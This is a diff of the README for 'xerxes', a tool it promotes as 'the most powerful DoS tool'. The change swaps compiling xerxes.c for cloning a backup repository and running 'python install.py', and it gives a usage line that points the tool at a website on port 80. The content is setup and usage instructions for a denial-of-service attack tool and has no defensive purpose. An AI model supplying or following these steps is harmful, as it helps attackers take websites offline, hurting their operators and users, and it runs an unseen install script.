@@ -1,7 +1,12 @@
 # xerxes
-XERXES the most powerful DoS tool
-Download the File xerxes.c to your Desktop
+XERXES - the most powerful DoS tool
+git clone this repo
 Open Terminal and type these commands
+
 cd Desktop
-gcc xerxes.c -o xerxes
+git clone https://github.com/deadfishhackers/xerxes-backup.git
+cd xerxes-backup
+python install.py
+
+
 USAGE : ./xerxes www.fakesite.com 80
